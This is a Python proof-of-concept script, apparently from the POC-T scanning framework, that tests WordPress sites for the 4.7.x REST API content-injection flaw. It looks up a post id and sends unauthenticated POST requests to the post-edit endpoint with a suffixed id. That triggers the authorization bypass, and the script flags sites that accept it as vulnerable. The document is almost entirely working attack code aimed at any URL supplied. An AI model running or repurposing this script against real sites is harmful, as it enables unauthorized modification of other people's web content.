#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

import requests
import json

API_ROUTE = '/index.php/wp-json/wp/v2/posts/'


def poc(url):
    url = url if '://' in url else 'http://' + url

    try:
        r = requests.get(url + API_ROUTE)
        id = json.loads(r.content)[0]['id']  # get an exist post id

        post_url = url + API_ROUTE + str(id)
        data1 = '{"id": "%s"}' % id
        data2 = '{"id": "%sa"}' % id
        r1 = requests.post(post_url, data1, headers={'Content-Type': 'application/json'})
        r2 = requests.post(post_url, data2, headers={'Content-Type': 'application/json'})
        print r2.text
        if r1.status_code > 400 and r2.status_code == 200 and r1.content != r2.content:
            print '[!] {} is vulnerable!'.format(post_url)
            return post_url
    except:
        return False

    return False


if __name__ == '__main__':
    poc('http://localhost/wordpress/wordpress-4.7.1/wordpress')